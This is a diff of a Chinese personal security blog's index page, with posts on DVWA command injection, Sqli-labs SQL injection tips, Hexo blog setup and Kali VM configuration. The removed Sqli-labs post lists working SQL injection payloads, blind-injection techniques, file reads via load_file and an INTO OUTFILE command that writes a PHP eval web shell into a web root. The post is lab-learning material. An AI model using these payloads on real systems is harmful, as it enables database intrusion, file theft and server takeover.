&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>stripslashes()</code>函数：返回一个去除转义反斜线后的字符串（<code>\&#39;</code> 转换为 <code>&#39;</code> 等等）。双反斜线（<code>\\</code>）被转换为单个反斜线（<code>\</code>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stripslashes ( string $str ) : string</span><br></pre></td></tr></table></figure>
+<p>该难度加入了对<code>Anti-CSRF token</code>的检查，并且获取的<code>$target</code>必须为<code>X.X.X.X</code>的格式，<code>X</code>也只能是数字，因此不存在命令注入漏洞</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/11/DVWA 2-Command Injection（命令注入）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-DVWA 1-Brute Force（暴力破解）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/10/DVWA 1-Brute Force（暴力破解）/">DVWA 1-Brute Force（暴力破解）</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/10/DVWA 1-Brute Force（暴力破解）/" class="archive-article-date">
+  	<time datetime="2019-02-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/10/DVWA 1-Brute Force（暴力破解）/">展开全文 >></a>
         </p>
       
 
@@ -1322,380 +1586,9 @@
 
 
   
-    <article id="post-Sqli-labs Tips" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/01/28/Sqli-labs Tips/">Sqli-labs Tips</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/01/28/Sqli-labs Tips/" class="archive-article-date">
-  	<time datetime="2019-01-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Tip-1-——-基础知识点"><a href="#Tip-1-——-基础知识点" class="headerlink" title="Tip 1 —— 基础知识点"></a>Tip 1 —— 基础知识点</h2><h4 id="（1）简单的用于尝试的语句"><a href="#（1）简单的用于尝试的语句" class="headerlink" title="（1）简单的用于尝试的语句"></a>（1）简单的用于尝试的语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br><span class="line"></span><br><span class="line">ps:--+和#可以互相替换</span><br></pre></td></tr></table></figure>
-<h4 id="（2）mysql命令行的简单命令"><a href="#（2）mysql命令行的简单命令" class="headerlink" title="（2）mysql命令行的简单命令"></a>（2）mysql命令行的简单命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看所有的数据库</span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">使用某个数据库(比如security数据库)</span><br><span class="line">use security;</span><br><span class="line"></span><br><span class="line">查看我们使用的数据库中有哪些表</span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">看一下我们想要查看的表的内容(比如users表)</span><br><span class="line">desc users;</span><br></pre></td></tr></table></figure>
-<h4 id="（3）利用-information-schema-数据库进行注入的命令"><a href="#（3）利用-information-schema-数据库进行注入的命令" class="headerlink" title="（3）利用 information_schema 数据库进行注入的命令"></a>（3）利用 <strong>information_schema</strong> 数据库进行注入的命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜数据库</span><br><span class="line">select schema_name from information_schema.schemata</span><br><span class="line"></span><br><span class="line">猜某库的所有表(比如security数据库)</span><br><span class="line">select table_name from information_schema.tables where table_schema=&apos;security&apos;</span><br><span class="line"></span><br><span class="line">猜某表的所有列(比如user表)</span><br><span class="line">select column_name from information_schema.columns where table_name=&apos;user&apos;</span><br></pre></td></tr></table></figure>
-<h4 id="（4）-order-by-命令"><a href="#（4）-order-by-命令" class="headerlink" title="（4） order by 命令"></a>（4） <strong>order by</strong> 命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用于显示某个表时，对表中某列进行排序，可以用来猜表有多少列</span><br><span class="line">比如：security-uers表中有3列，可以order by 1 ;order by 2;order by 3;分别是对第1，2，3列排序</span><br><span class="line">比如：security-email表中有2列，可以order by 1 ;order by 2;分别是对第1，2列排序</span><br><span class="line"></span><br><span class="line">ps：如果某一个表只有X列，当order by x+1时，就会开始出错，这一点可以用来猜表有多少列</span><br><span class="line">具体例子可以看less-1中的讲解</span><br></pre></td></tr></table></figure>
-<h4 id="（5）-union-命令"><a href="#（5）-union-命令" class="headerlink" title="（5） union 命令"></a>（5） <strong>union</strong> 命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union的作用是将两个sql语句进行联合</span><br><span class="line">union前后的两个sql语句的选择列数要相同才可以</span><br><span class="line">具体理解看less-1里的例子</span><br></pre></td></tr></table></figure>
-<h4 id="（6）几个常用函数"><a href="#（6）几个常用函数" class="headerlink" title="（6）几个常用函数"></a>（6）几个常用函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MySQL版本：version()</span><br><span class="line">数据库用户名：user()</span><br><span class="line">数据库名：database()</span><br><span class="line">数据库路径：@@datadir</span><br><span class="line">操作系统版本：@@version_compile_os</span><br></pre></td></tr></table></figure>
-<h4 id="（7）Limit的用法"><a href="#（7）Limit的用法" class="headerlink" title="（7）Limit的用法"></a>（7）Limit的用法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">limit 0，1				//表示从第1行开始，显示1行</span><br><span class="line">limit 1，3				//表示从第2行开始，显示3行</span><br><span class="line"></span><br><span class="line">可以参考以下图片看详细用法：</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/0.png" alt="0"></p>
-<h2 id="Tip-2-——-关于盲注的知识点"><a href="#Tip-2-——-关于盲注的知识点" class="headerlink" title="Tip 2 —— 关于盲注的知识点"></a>Tip 2 —— 关于盲注的知识点</h2><p>什么是盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注的类型分为以下三种：</p>
-<ul>
-<li>基于布尔SQL盲注</li>
-<li>基于时间的SQL盲注</li>
-<li>基于报错的SQL盲注</li>
-</ul>
-<p>关于这方面知识的文章很多，我们这里就只做简单介绍</p>
-<h4 id="（1）基于布尔SQL盲注"><a href="#（1）基于布尔SQL盲注" class="headerlink" title="（1）基于布尔SQL盲注"></a>（1）基于布尔SQL盲注</h4><p>常用的函数：<strong>left()，substr()，mid()，ascii()，ord()</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left(string,length)	  	//left()函数用于截取字符串string的前length个字符</span><br><span class="line"></span><br><span class="line">substr(string,start,length)	//substr()函数用于截取字符串string，从start位置开始，截取length长度</span><br><span class="line"></span><br><span class="line">mid(string,start,length)	//mid()函数功能和substr()函数一样</span><br><span class="line"></span><br><span class="line">ascii(string)			//ascii()函数用于将字符串string转换成ASCII码</span><br><span class="line"></span><br><span class="line">ord()				//ord()函数功能和ascii()函数一样</span><br></pre></td></tr></table></figure>
-<p>举几个<strong>栗子</strong>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left(database(),3)</span><br><span class="line">//database()用于显示数据库名称，3表示截取前3位，如database名称为&quot;security&quot;，那么结果就是&quot;sec&quot;</span><br><span class="line"></span><br><span class="line">left(database(),1) &gt; &apos;w&apos;</span><br><span class="line">//这个语句结果是否定的，因为&quot;security&quot;截取前1个字符是&quot;s&quot;，在26个字母顺序中&quot;s&quot;是在&quot;w&quot;前面的,</span><br><span class="line">所以是小于。如果将表达式的&quot;w&quot;换成&quot;a&quot;，则结果是肯定的</span><br><span class="line"></span><br><span class="line">substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)</span><br><span class="line">//首先string部分的结果是&quot;email&quot;，那么这整个语句的结果是&quot;a&quot;。关于limit的用法，可以在Tip 1上面看到</span><br></pre></td></tr></table></figure>
-<p>另外，关于正则表达式可以参考这篇文章：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">盲注之正则表达式</a></p>
-<h4 id="（2）基于报错的SQL盲注"><a href="#（2）基于报错的SQL盲注" class="headerlink" title="（2）基于报错的SQL盲注"></a>（2）基于报错的SQL盲注</h4><p>什么是报错盲注：构造payload让信息通过错误提示回显出来</p>
-<p>这里我们简单了解一下 <strong>extractvalue()和concat()</strong> 函数的用法就行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select database()),0x7e))</span><br><span class="line">//这个函数执行后会将数据库的名称通过报错方式显示出来</span><br></pre></td></tr></table></figure>
-<h4 id="（3）基于时间的SQL盲注"><a href="#（3）基于时间的SQL盲注" class="headerlink" title="（3）基于时间的SQL盲注"></a>（3）基于时间的SQL盲注</h4><p>什么是时间盲注：原理于布尔盲注差不多，只不过添加控制时间的函数：当结果正确（错误）时，让页面停留n秒后再返回结果</p>
-<p>常用函数：<strong>if()，sleep()</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3)	//如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</span><br><span class="line">sleep(n)		//睡眠n秒</span><br></pre></td></tr></table></figure>
-<p>举个<strong>栗子</strong>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substr(database(),1,1))=&apos;s&apos;,0,sleep(5))	//如果数据库的名称的第一个字符是&apos;s&apos;，就直接返回结果，不然就延时5秒再返回结果</span><br></pre></td></tr></table></figure>
-<h2 id="Tip-3-——-导入导出文件知识点"><a href="#Tip-3-——-导入导出文件知识点" class="headerlink" title="Tip 3 —— 导入导出文件知识点"></a>Tip 3 —— 导入导出文件知识点</h2><p>1、load_file()导出文件</p>
-<p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
-<p>使用条件：</p>
-<ol>
-<li>必须有权限读取并且文件必须完全可读 </li>
-</ol>
-<p>​    and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。</p>
-<p>​    and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误，应该是管理员给数据库帐户降权</p>
-<ol start="2">
-<li><p>欲读取文件必须在服务器上 </p>
-</li>
-<li><p>必须指定文件完整的路径 </p>
-</li>
-<li><p>欲读取文件必须小于 max_allowed_packet</p>
-</li>
-</ol>
-<p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到只有administrators才能访问的文件，users就别想load_file出来。</p>
-<p>在实际的注入中，我们有两个难点需要解决：</p>
-<ol>
-<li><p>绝对物理路径</p>
-</li>
-<li><p>构造有效的畸形语句 （报错爆出绝对路径）</p>
-</li>
-</ol>
-<p>在很多PHP程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露WEB目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。</p>
-<p>常用路径：<br><a href="http://www.cnblogs.com/lcamry/p/5729087.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5729087.html</a></p>
-<p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))</span><br></pre></td></tr></table></figure>
-<p>利用hex()将文件内容导出来，尤其是smb文件时可以使用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) </span><br><span class="line">Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII代码</span><br><span class="line"></span><br><span class="line">-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) </span><br><span class="line">Explain：“c:/boot.ini”的16进制是“0x633a2f626f6f742e696e69”</span><br><span class="line"></span><br><span class="line">-1 union select 1,1,1,load_file(c:\\boot.ini) </span><br><span class="line">Explain:路径里的/用 \\代替</span><br></pre></td></tr></table></figure>
-<p>2、文件导入到数据库</p>
-<p>LOAD DATA INFILE语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p>
-<p>在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。</p>
-<p>函数具体介绍：对于参数介绍这里就不过多的赘述了，可以参考mysql的文档。（提醒：参考文档才是最佳的学习资料）</p>
-<p>示例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &apos;/tmp/t0.txt&apos; ignore into table t0 character set gbk fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos;</span><br></pre></td></tr></table></figure>
-<p>3、导入到文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT.....INTO OUTFILE &apos;file_name&apos;</span><br></pre></td></tr></table></figure>
-<p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name不能是一个已经存在的文件。</p>
-<p>我们一般有两种利用形式：</p>
-<p>第一种直接将select内容导入到文件中：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select version() into outfile “c:\\phpnow\\htdocs\\test.php”</span><br></pre></td></tr></table></figure>
-<p>此处将version()替换成一句话，&lt;?php @eval($_post[“mima”])?&gt;也即</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select  &lt;?php @eval($_post[“mima”])?&gt;  into outfile “c:\\phpnow\\htdocs\\test.php”</span><br></pre></td></tr></table></figure>
-<p>直接连接一句话就可以了，其实在select内容中不仅仅是可以上传一句话的，也可以上传很多的内容。</p>
-<p>第二种修改文件结尾：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16进制文件</span><br></pre></td></tr></table></figure>
-<p>解释：通常是用\r\n结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY</p>
-<p>16进制可以为一句话或者其他任何的代码，可自行构造。在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：<a href="http://www.cnblogs.com/lcamry/p/5505110.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5505110.html</a></p>
-<p>注意：</p>
-<p>（1）可能在文件路径当中要注意转义，这个要看具体的环境</p>
-<p>（2）上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’</span><br></pre></td></tr></table></figure>
-<p>可以利用该语句将服务器当中的内容导入到web服务器下的目录，这样就可以得到数据了。上述my.ini当中存在password项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/01/28/Sqli-labs Tips/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-hexo-+-github搭建博客" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/01/27/hexo-+-github搭建博客/">hexo + github搭建博客</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/01/27/hexo-+-github搭建博客/" class="archive-article-date">
-  	<time datetime="2019-01-27T12:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Tip-1"><a href="#Tip-1" class="headerlink" title="Tip 1"></a>Tip 1</h2><p>前面大致的步骤参考这篇文章：<a href="https://mochazz.github.io/2017/07/26/hexo-build/" target="_blank" rel="noopener">https://mochazz.github.io/2017/07/26/hexo-build/</a></p>
-<h2 id="Tip-2"><a href="#Tip-2" class="headerlink" title="Tip 2"></a>Tip 2</h2><p>可能Github有更新，仓库的地址格式有些变动，我们还是直接点击仓库，然后根据浏览器弹出的新的页面的URL，复制粘贴进去比较好</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/1.png" alt="1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/2.png" alt="2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/3.png" alt="3"></p>
-<h2 id="Tip-3"><a href="#Tip-3" class="headerlink" title="Tip 3"></a>Tip 3</h2><p>去这个网站下载主题：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
-<p>挑选好喜欢的博客后，点击链接到他们Github的页面，下载下来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/4.png" alt="4"></p>
-<p>直接解压到 <strong>themes</strong> 这个文件夹下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/5.png" alt="5"></p>
-<p>然后在 <strong>_config.yml</strong> 这个配置文件中 <strong>Extensions</strong> 模块的 <strong>theme</strong> 改成刚才那个文件的名字，模板就运用成功了，然后就可以根据自己的喜好修改一些东西</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/6.png" alt="6"></p>
-<h2 id="Tip-4"><a href="#Tip-4" class="headerlink" title="Tip 4"></a>Tip 4</h2><p>主题设置完之后，本地测试通过（hexo clean + hexo s + 访问127.0.0.1:4000），经过个人喜好修改的博客可以正常显示，但是上传到Github上就不行（hexo clean + hexo g &amp;&amp; hexo d）。后来发现是 <strong>_config.yml</strong> 中有些参数没设置好：</p>
-<p>在仓库界面中点击 <strong>Setting</strong> 找到 <strong>Repository name</strong> 写到 <strong>_config.yml</strong> 文件中的 <strong>url</strong>   </p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/7.png" alt="7"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/8.png" alt="8"></p>
-<p>找到 <strong>GitHub Pages</strong> 中我们获取到的博客地址，同样写到 <strong>_config.yml</strong> 文件中的 <strong>root</strong> </p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/9.png" alt="9"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/10.png" alt="10"></p>
-<h3 id="现在再次访问博客，就可以正常显示了"><a href="#现在再次访问博客，就可以正常显示了" class="headerlink" title="现在再次访问博客，就可以正常显示了"></a>现在再次访问博客，就可以正常显示了</h3><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/hexo%2Bgit/11.png" alt="11"></p>
-<hr>
-<h2 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a>安装问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git config --global user.email &quot;240375426@qq.com&quot;</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">博客搭建</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/01/27/hexo-+-github搭建博客/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Kali系统—工具安装和系统调整" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2018/08/01/Kali系统—工具安装和系统调整/">Kali系统 — 工具安装和系统调整</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2018/08/01/Kali系统—工具安装和系统调整/" class="archive-article-date">
-  	<time datetime="2018-07-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="VMware-tools的安装"><a href="#VMware-tools的安装" class="headerlink" title="VMware tools的安装"></a>VMware tools的安装</h2><ul>
-<li><p>点击“虚拟机”-&gt;安装VMware tools</p>
-</li>
-<li><p>此时在在文件管理栏会出现一个VMware tools distrib的位置，访问发现一个文件</p>
-</li>
-<li><p>但是此时我们是没有权限tar这个压缩包的，做法是先将它拷贝到我们的用户主目录下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp VMwareTools-10.2.5.8068393.tar.gz ~/</span><br></pre></td></tr></table></figure>
-<p>-然后再将之解压下来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxf VMwareTools-10.2.5.8068393.tar.gz</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>解压下来我们可以看到vmware-tools-distrib这个文件夹，进去之后执行这个vmware-install.pl</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">./vmware-install.pl</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>做到这里的时候，我们的VMware tools已经安装好，此时就可以实现将Window的文字或文件复制到Linux下了</p>
-</li>
-</ul>
-<hr>
-<h2 id="网络配置（临时）"><a href="#网络配置（临时）" class="headerlink" title="网络配置（临时）"></a>网络配置（临时）</h2><p><strong>注意</strong>：以下步骤制定的地址是临时的，重启之后恢复</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dhclient eth0</span><br><span class="line">ifconfig eth0 192.168.1.11/24</span><br><span class="line">route add default gw 192.168.1.1</span><br><span class="line">echo nameserver 192.168.1.1 &gt; /etc/resolv.conf</span><br></pre></td></tr></table></figure>
-<p>更改网卡的地址（记得IP地址加掩码）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.1.10/24</span><br></pre></td></tr></table></figure>
